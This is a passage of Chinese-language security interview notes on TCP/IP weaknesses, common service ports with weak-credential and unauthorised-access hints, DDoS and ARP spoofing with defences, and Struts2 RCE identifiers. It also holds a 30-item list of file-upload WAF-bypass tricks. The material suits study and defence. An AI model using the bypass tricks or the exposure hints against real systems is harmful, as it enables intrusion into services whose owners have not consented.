1. 不能提供可靠的身份验证(三次握手提供可靠连接)
2. 不能有效防止信息泄漏(窃听)
3. 没有提供可靠的信息完整性验证手段(算法不够完整)
4. 协议没有手段控制资源占用和分配(SYN flood、DoS)

> TCP/IP

1. IP 欺骗(攻击者首先要便被假冒的主机对目标主机发来的数据包不做响应,SYN),猜测序列号
2. TCP 会话劫持(认证后猜测序列号)
3. 拒绝服务(SYN Flood)
4. ping 溢出
5. RST/FIN

#### TCP/UDP 区别 如何做可靠性连接 为什么

1. TCP 慢、可靠、面向连接、大量数据传送，UDP 反之
1. 确认和重传：接收方收到报文就会确认，发送方发送一段时间后没有收到确认就重传。

1. 数据校验

1. 数据合理分片和排序：

   UDP：IP 数据报大于 1500 字节,大于 MTU.这个时候发送方 IP 层就需要分片(fragmentation).把数据报分成若干片,使每一片都小于 MTU.而接收方 IP 层则需要进行数据报的重组.这样就会多做许多事情,而更严重的是,由于 UDP 的特性,当某一片数据传送中丢失时,接收方便无法重组数据报.将导致丢弃整个 UDP 数据报.

   tcp 会按 MTU 合理分片，接收方会缓存未按序到达的数据，重新排序后再交给应用层。

4、流量控制：当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。

5、拥塞控制：当网络拥塞时，减少数据的发送。

![](http://ac-HSNl7zbI.clouddn.com/gKeaXY7TS7XekKwjkhA67DzAznD88lkSgNBmPG7Q.jpg)

    信道不可靠, 但是通信双方需要就某个问题达成一致, 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值, 所以三次握手不是TCP本身的要求, 而是为了满足"在不可靠信道上可靠地传输信息"这一需求所导致的.请注意这里的本质需求, 信道不可靠, 数据传输要可靠

### 端口

#### 常见端口

| Port        | Server                                   | Port           | Server                             | Port        | Server                                                                |
| ----------- | ---------------------------------------- | -------------- | ---------------------------------- | ----------- | --------------------------------------------------------------------- |
| 21          | FTP                                      | 22             | SSH                                | 23          | Telnet                                                                |
| 80          | web                                      | 80-89          | web                                | 161         | SNMP                                                                  |
| 389         | LDAP                                     | 443            | SSL                                | 445         | SMB                                                                   |
| 512,513,514 | Rexec                                    | 873            | Rsync 未授权                       | 1025,111    | NFS                                                                   |
| 1433        | MSSQL                                    | 1521           | Oracle:(iSqlPlus Port:5560,7778)   | 2082/2083   | cpanel 主机管理系统登陆 （国外用较多）                                |
| 2222        | DA 虚拟主机管理系统登陆 （国外用较多）   | 2601,2604      | zebra 路由，默认密码 zebra         | 3128        | squid 代理默认端口，如果没设置口令很可能就直接漫游内网了              |
| 3306        | MySQL                                    | 3312/3311      | kangle 主机管理系统登陆            | 3389        | 远程桌面                                                              |
| 4440        | rundeck                                  | 5432           | PostgreSQL                         | 5900        | vnc                                                                   |
| 5984        | CouchDB http://xxx:5984/\_utils/         | 6082           | varnish                            | 6379        | redis 未授权                                                          |
| 7001,7002   | WebLogic 默认弱口令，反序列              | 7778           | Kloxo 主机控制面板登录             | 8000-9090   | 都是一些常见的 web 端口，有些运维喜欢把管理后台开在这些非 80 的端口上 |
| 8080        | tomcat/WDCP 主机管理系统，默认弱口令     | 8080,8089,9090 | JBOSS                              | 8083        | Vestacp 主机管理系统 （国外用较多）                                   |
| 8649        | ganglia                                  | 8888           | amh/LuManager 主机管理系统默认端口 | 9200,9300   | elasticsearch                                                         |
| 10000       | Virtualmin/Webmin 服务器虚拟主机管理系统 | 11211          | memcache 未授权访问                | 27017,27018 | Mongodb 未授权访问                                                    |
| 28017       | mongodb 统计页面                         | 50000          | SAP 命令执行                       | 50070,50030 | hadoop 默认端口未授权访问                                             |

### 版本差异

#### MySQL4,5 的区别

1. information_schema(>=5.0)
2. 多用户操作(>=5.0)

#### PHP5,7 区别

1. 移除一些旧的扩展，被移迁移到了 PECL（例如：mysql）
2. 移除 SAPIs 的支持
3. <?和<? language=“php”这样的标签被移除了
4. 16 进制的字符串转换被废除了
5. HTTP_RAW_POST_DATA 移除了（可以使用 php://input 替代）
6. 静态函数里面不再支持通过一个不兼容的$this 调用一个非静态的函数了 $o = & new className{}，不再支持这样的写法
7. php.ini 文件移除了#作为注释，统一用;去注释

### DDoS

#### DDoS 原理, 反射原理，TCP 可以反射攻击吗

> 三种类型

1. 个人组建僵尸网络发动 DDoS
2. 利用开放服务器（DNS、NTP、简单网管协议 SNMP）脆弱性进行反射攻击
3. 智能/IoT 设备协议（简单服务发现协议 SSDP，30 倍）脆弱性进行反射攻击

#### DDoS 防御策略

1. 源验证／反向探测，对源进行探测和人机识别，段包括 cookie、识别码等；
2. 限源，即对源 IP 或协议进行限制，黑名单是一个常见手段；
3. 特征丢弃，依据数据包的特征或访问行为进行丢弃，如基于 Payload 特征、发包行为特征、QPS 特征等；
4. 限速，对流量／访问的速率进行限流。

#### 大网站子站的安全性如何保证

### ARP 攻击

#### 原理

    ARP请求用于询问某IP地址的物理地址(MAC)，只有被询问主机回复，收到后会保留在两机一段时间。
    欺骗至少要满足：被信任协议ARP，pc会向所有人广播ARP询问信息X， 并且hacker的信息优先X到达。
    攻击：向网络发送大量伪造的IP和MAC地址，占用带宽;并且由于重复发送大量虚假重复信息，虚假信息会导致被攻击主机网络受限或数据包截获。

#### ARP 为什么能这样做

    ARP是信任协议，ARP设计决定

#### ARP 如何防范

- 静态绑定网关 IP-MAC
- ARP 防火墙
- VLAN 和交换机端口绑定（VLAN 划分减少影响；学习地址后再绑定）
- 动态 ARP 检查
- DAI（DHCP Snooping 绑定表+ARP access-list）
- IPV6（保存签名，拥有权可验证）

### 上传

#### 上传绕过 WAF

1. filename 在 content-type 下面
2. .asp{80-90}
3. NTFS ADS
4. .asp...
5. boundary 不一致
6. iis6 分号截断 asp.asp;asp.jpg
7. apache 解析漏洞 php.php.ddd
8. boundary 和 content-disposition 中间插入换行
9. hello.php:a.jpg 然后 hello.<<<
10. filename=php.php
11. filename="a.txt";filename="a.php"
12. name=\n"file";filename="a.php"
13. content-disposition:\n
14. .htaccess 文件
15. a.jpg.\nphp
16. 去掉 content-disposition 的 form-data 字段
17. php<5.3 单双引号截断特性
18. 删掉 content-disposition: form-data;
19. content-disposition\00:
20. {char}+content-disposition
21. head 头的 content-type: tab
22. head 头的 content-type: multipart/form-DATA
23. filename 后缀改为大写
24. head 头的 Content-Type: multipart/form-data;\n
25. .asp 空格
26. .asp0x00.jpg 截断
27. 双 boundary
28. file\nname="php.php"
29. head 头 content-type 空格:
30. form-data 字段与 name 字段交换位置

### 常见漏洞编号

1. S2-045 Jakarta Multipart 解析器 远程命令执行
2. S2-016 参数 action 的值 redirect 以及 redirectAction 没有正确过滤，导致 ognl 代码执行
3. S2-032 用户开启动态方法调用的情况下(method 没有过滤)，会被攻击者实现远程代码执行攻击

### 参考

1. wooyun drops
2. http://www.thinkings.org/2017/02/13/my-waf-bypass-series-article.html
3. http://www.blbana.cc/2016/10/16/266/
4. http://blog.csdn.net/whuslei/article/details/6667471
5. https://www.zhihu.com/question/24853633
6. http://jzking121.blog.51cto.com/5436671/1835921
7. 遗漏和错误请私戳
